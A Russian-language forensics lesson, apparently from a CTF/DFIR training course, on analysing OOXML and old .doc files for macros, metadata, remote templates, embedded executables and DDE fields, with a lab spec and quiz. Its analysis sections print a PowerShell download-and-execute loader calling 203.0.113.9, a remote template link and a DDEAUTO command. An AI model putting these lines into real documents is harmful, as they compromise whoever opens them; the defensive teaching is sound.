---
id: doc-ooxml-internals
title: 'OOXML изнутри: docx, xlsx, pptx как ZIP-архивы'
category: forensics
parent: forensics-doc-formats
difficulty: medium
order: 1
tags: [forensics, ooxml, docx, xlsx, macros, metadata]
prerequisites: [forensics-file-magic]
useful_for:
  - 'CTF Forensics категория'
  - 'DFIR / Incident Response'
  - 'Анализ образов и артефактов'
estimated_minutes: 45
summary: 'Как устроены офисные документы OOXML, где метаданные, макросы и встроенные объекты, и как их извлекать.'
lab:
  kind: shell
  title: 'Практика: OOXML изнутри'
  toolset: [core, grep, strings]
  workdir: /home/student/task
  files: [task.md]
  check: 'grep -q ''nto{'' answer.txt'
  hints:
    - "Повторение (`forensics-file-magic`): сначала `head -n 5 evidence.txt` — вспомни приём из «forensics-file-magic»."
    - 'Прочитай файл-артефакт: `cat <файл>`.'
    - 'Ищи строку с меткой nto{.'
    - 'Сохрани: `grep nto <файл> > answer.txt`.'
---

## Вопрос, с которого всё начинается

Пришёл документ `.docx` — он может быть безобидным, а может содержать макрос или
встроенный объект. Формат OOXML — это **ZIP** с XML внутри. Разберём структуру.

## Наш пример: подозрительный .docx

## Шаг 1: это ZIP

```
$ file report.docx
report.docx: Microsoft Word 2007+
$ unzip -l report.docx
  [Content_Types].xml
  word/document.xml
  word/vbaProject.bin
  docProps/core.xml
```

`vbaProject.bin` — уже сигнал: в документе есть **макросы**.

## Шаг 2: метаданные

```
$ unzip -p report.docx docProps/core.xml | head
<dc:creator>Ivan</dc:creator>
<cp:lastModifiedBy>Ivan</cp:lastModifiedBy>
<dcterms:created>2026-01-14T03:20:00Z</dcterms:created>
```

`core.xml` — авторство и времена. Расхождение created/modified — зацепка.

## Шаг 3: макросы

Макросы — это VBA. Извлекаем и анализируем:

```
$ olevba report.docx
VBA MACRO ThisDocument.cls
  AutoOpen → Shell("powershell -enc ...")
```

`AutoOpen` — автозапуск при открытии. Это классический вектор.

## Шаг 4: встроенные объекты

Документ может содержать:

- встроенный `.exe` (в `word/embeddings/`);
- OLE-объекты;
- внешние ссылки (`word/_rels/`) — откуда подгружаются данные (DDE, remote template).

```
$ unzip -l report.docx | grep embeddings
word/embeddings/oleObject1.bin
```

## Шаг 5: что искать

- макросы (`vbaProject.bin`);
- внешние ссылки (remote template injection);
- встроенные файлы;
- метаданные автора/времени.

## Что мы теперь знаем

- OOXML — ZIP с XML.
- `vbaProject.bin` = макросы.
- `core.xml` — авторство и времена.
- `embeddings/` — встроенные объекты.
- Внешние ссылки = потенциальная загрузка.

## Если не сработало

- Файл зашифрован паролем? Нужен пароль.
- Старый формат (.doc)? Используй OLE-парсеры.
- Макрос скомпилирован? Анализируй p-code.

## Практический разбор: разбор макроса

Макрос — это VBA внутри `vbaProject.bin`. Извлечём и декомпилируем его:

```bash
$ olevba report.docx
VBA MACRO ThisDocument.cls
in file: word/vbaProject.bin
-------------------------------------------------------------------------------
Private Sub Document_Open()
    Dim s As String
    s = "powershell -w hidden -enc SQBFAFgA..."
    Shell s, vbHide
End Sub
```

`Document_Open`/`AutoOpen` — автозапуск при открытии. Строка `-enc` — base64-
закодированная PowerShell-команда. Декодируем её, чтобы увидеть нагрузку:

```bash
$ echo 'SQBFAFgA...' | base64 -d
IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')
```

Классический загрузчик: скачивает и выполняет вторую стадию. Дополнительно
`olevba` помечает подозрительные конструкции (`AutoExec`, `Shell`, `CreateObject`).

## Remote Template Injection

Документ может не содержать макроса вовсе, а подгружать шаблон извне:

```bash
$ cat word/_rels/settings.xml.rels
<Relationship Target="http://203.0.113.9/template.dotm"
    TargetMode="External" .../>
```

При открытии Word подтягивает удалённый `.dotm` с макросом — обход проверок,
ищущих `vbaProject.bin`. Это техника **remote template injection**, и признак
её — внешние ссылки в `_rels`. Проверяй все `.rels` на `TargetMode="External"`.

## Практический разбор: встроенные объекты и DDE

Документ может нести встроенный исполняемый файл в `word/embeddings/`:

```bash
$ unzip -l report.docx | grep -E 'embeddings|media'
  28416  word/embeddings/oleObject1.bin
$ oledump.py word/embeddings/oleObject1.bin
  1:        114 '\x01CompObj'
  2:     282624 'MZ'  <- PE executable
```

Маркер `MZ` означает встроенный PE — это замаскированный `.exe`. Второй вектор —
DDE: документ предлагает «обновить поле», которое запускает команду:

```
{DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"}
```

DDE-команда видна в `word/document.xml` как поле. Также встречаются внешние
ссылки в `document.xml.rels` на SMB/HTTP-ресурсы (загрузка при открытии).

## Старый формат .doc (OLE)

Формат `.doc` — это OLE-контейнер, а не ZIP. Его разбирают OLE-инструментами:

```bash
$ oleid suspicious.doc
$ oledump.py suspicious.doc | grep -i macro
  4: 'Macros/VBA/ThisDocument'
```

`oleid` показывает индикаторы (макросы, шифрование, объекты). Для `.doc` нет
`core.xml`; метаданные лежат в `SummaryInformation` и читаются
`exiftool`/`olemeta`. Многие вредоносы используют именно старый формат, чтобы
обойти анализаторы OOXML.

## Что искать

- Макросы (`vbaProject.bin`, `Macros/VBA/`).
- Внешние ссылки в `.rels` (remote template, SMB/HTTP).
- Встроенные PE в `embeddings/`.
- DDE-поля в `document.xml`.
- Метаданные автора/времени (расхождения).

## Чек-лист анализа документа

1. Определи формат (`file`): OOXML (ZIP) или OLE (.doc).
2. Для OOXML — распакуй и перечисли содержимое.
3. Проверь `vbaProject.bin`/`Macros/VBA` на макросы.
4. Прогони `olevba` и разбери автозапуск и строки.
5. Проверь `.rels` на внешние ссылки (`TargetMode="External"`).
6. Осмотри `embeddings/` на встроенные PE/OLE.
7. Ищи DDE-поля в `document.xml`.
8. Прочитай метаданные (`core.xml`/`SummaryInformation`).

## Ограничения метода

- **Пароль на документе.** Зашифрованный OOXML не распакуется без пароля;
  `msoffcrypto-tool` помогает при известном пароле.
- **Скомпилированный VBA.** P-code без исходников сложнее читать; используй
  `pcode2code`.
- **Стеганография.** Данные могут быть спрятаны в изображениях или XML-атрибутах.
- **Обфускация VBA.** Строки собираются по частям; помогают эмуляторы
  (`ViperMonkey`).

## Связь с другими артефактами

- **Почта.** Письмо-носитель даёт отправителя, тему и вложение — контекст.
- **Файловая система.** Время создания/открытия документа связывает его с
  инцидентом.
- **Загрузки браузера.** Откуда скачан документ.
- **Сетевые логи.** Обращения к внешним ссылкам (`_rels`) фиксируются прокси/DNS.
- **Процессы.** Запуск `powershell`/`cmd` после открытия — подтверждение
  эксплуатации.

## Практический разбор: эмуляция макроса

Чтобы понять, что делает макрос, не запуская Office, его эмулируют. Извлечём
VBA и прогоним через `ViperMonkey`:

```bash
$ olevba --deobf report.docx > macro.vba
$ python2 vipermonkey/vipermonkey.py macro.vba
```
```
ViperMonkey: VBA Macros analyzed
Executing: Shell "powershell -w hidden -enc SQBFAFgA..."
Executing: CreateObject("WinHttp.WinHttpRequest.5.1")
URL: http://203.0.113.9/a.ps1
```

Эмулятор показал URL без запуска Windows — безопасный способ получить индикаторы.
Для скомпилированного VBA (p-code без исходников) используют `pcode2code`:

```bash
$ pcode2code word/vbaProject.bin > recovered.vba
```

Так восстанавливают исходный код макроса, даже если он был удалён.

## Метаданные и авторство

`core.xml` и `app.xml` хранят автора, организацию, время и число правок:

```bash
$ unzip -p report.docx docProps/app.xml | grep -E 'Company|TotalTime'
<Company>ACME Corp</Company>
<TotalTime>42</TotalTime>
```

Расхождение `created` и `modified` в `core.xml` — зацепка: файл мог быть
создан задним числом (timestomping). Сверяй метаданные документа с временем
доставки письма и появления файла на диске.

## Частые заблуждения

- «В .docx не может быть макроса» — может, через `vbaProject.bin` или внешний
  шаблон (remote template).
- «Нет vbaProject.bin — значит чисто» — внешние `.rels` и DDE тоже исполняют
  команды.
- «Метаданные всегда правдивы» — автор и время легко подделать.
- «Эмуляция заменяет динамику» — эмулятор не выполняет всё; сложные макросы
  требуют песочницы.

## Что записать в отчёт

- Формат документа и его хэш.
- Наличие и назначение макросов (автозапуск, строки).
- Внешние ссылки (remote template, SMB/HTTP) и их адреса.
- Встроенные объекты (`embeddings/`, PE-маркеры).
- DDE-поля и их команды.
- Метаданные (автор, организация, времена) и расхождения.
- Ограничения: шифрование, p-code, обфускация.

## Практический разбор: анализ вредоносного .doc

Старый формат `.doc` — OLE-контейнер, поэтому его разбирают иначе. Начнём с
индикаторов:

```bash
$ oleid suspicious.doc
+----------+--------------------+----------+
| Indicator| Value              | Risk     |
+----------+--------------------+----------+
| VBA Macros| Yes              | HIGH     |
| ObjectPool| Yes              | MEDIUM   |
+----------+--------------------+----------+
```

Дальше извлекаем поток макроса и метаданные:

```bash
$ oledump.py suspicious.doc
  1:        114 '\x01CompObj'
  2:       4096 'Macros/VBA/_VBA_PROJECT'
  3:      10240 'Macros/VBA/ThisDocument'
$ oledump.py -s 3 -v suspicious.doc > macro.vba
```

Поток `Macros/VBA/*` содержит VBA; `-v` выдаёт декомпилированный вид. Метаданные
(`SummaryInformation`) читаются `olemeta`:

```bash
$ olemeta suspicious.doc | grep -E 'author|created'
```

Расхождение автора в метаданных и в коде — частая зацепка.

## Инструменты и их назначение

| Инструмент | Формат | Назначение |
|---|---|---|
| `unzip`/`zipinfo` | OOXML | список частей |
| `olevba` | OOXML/OLE | извлечение и анализ VBA |
| `oledump.py` | OLE | потоки и макросы |
| `oleid` | OLE | индикаторы риска |
| `msoffcrypto-tool` | оба | снятие пароля |
| `ViperMonkey` | VBA | эмуляция |
| `pcode2code` | VBA | восстановление из p-code |

Комбинация инструментов покрывает и современный, и старый форматы.

## Что записать в отчёт

- Формат и хэш документа.
- Извлечённый макрос и его действие (автозапуск, сетевые вызовы).
- Внешние ссылки и встроенные объекты.
- Метаданные и расхождения.
- Ограничения: пароль, p-code, обфускация.

## Практический разбор: сравнение версий документа

Если есть несколько версий одного документа, их различия выдают правки
злоумышленника. Распакуем обе и сравним XML:

```bash
$ mkdir v1 v2
$ unzip -q report_v1.docx -d v1
$ unzip -q report_v2.docx -d v2
$ diff -r v1 v2 | head
Only in v2: word/vbaProject.bin
```

Появление `vbaProject.bin` во второй версии означает, что макрос добавили
позже. Аналогично сравнивают `document.xml` и `.rels`: новая внешняя ссылка —
признак remote template injection, вставленного после рассылки чистой версии.

## Связь с другими артефактами

- **Почта.** Вложения и заголовки дают отправителя, тему и время доставки.
- **Загрузки.** Откуда документ скачан (история браузера).
- **Прокси/DNS.** Обращения к внешним ссылкам из `.rels` видны в сетевых логах.
- **Процессы.** Запуск `powershell`/`winword` после открытия подтверждает
  эксплуатацию.
- **Файловая система.** Время создания и открытия связывает документ с
  инцидентом.

Сопоставление документа с почтой и сетевыми логами даёт полную цепочку
доставки и запуска.

## Типовые индикаторы вредоносного документа

| Индикатор | Значение |
|---|---|
| `vbaProject.bin` | макросы |
| `AutoOpen`/`Document_Open` | автозапуск |
| `.rels` с `External` | remote template |
| `embeddings/*` с `MZ` | встроенный PE |
| `DDEAUTO` | выполнение команды |

## Квиз

Проверь себя.

```quiz
- question: Что представляет собой .docx?
  options:
    - 'бинарный файл'
    - 'ZIP-архив с XML'
    - 'текстовый файл'
    - 'образ диска'
  answer: 1
  explanation: 'OOXML — это zip-контейнер с XML-компонентами.'
- question: Что означает vbaProject.bin?
  options:
    - 'картинку'
    - 'наличие макросов VBA'
    - 'шрифт'
    - 'пароль'
  answer: 1
  explanation: 'Это хранилище VBA-макросов документа.'
- question: Где искать автора и время?
  options:
    - 'в document.xml'
    - 'в docProps/core.xml'
    - 'в vbaProject.bin'
    - 'в embeddings'
  answer: 1
  explanation: 'core.xml содержит creator и created/modified.'
- question: Чем опасен AutoOpen?
  options:
    - 'ничем'
    - 'запускает макрос при открытии документа'
    - 'удаляет файл'
    - 'шифрует'
  answer: 1
  explanation: 'AutoOpen — автозапуск VBA при открытии.'
```

## Куда дальше

Дальше — **ODF**: открытый аналог OOXML с похожей, но своей структурой. А пока запомни:
`.docx` — это ZIP, и смотреть надо на части, а не на страницу.

## Где пригодится

- **CTF Forensics** — задачи со скрытыми данными в документах.
- **Анализ малвари** — разбор офисных документов без запуска.
- **DFIR / Incident Response** — исследование вложений из фишинга.
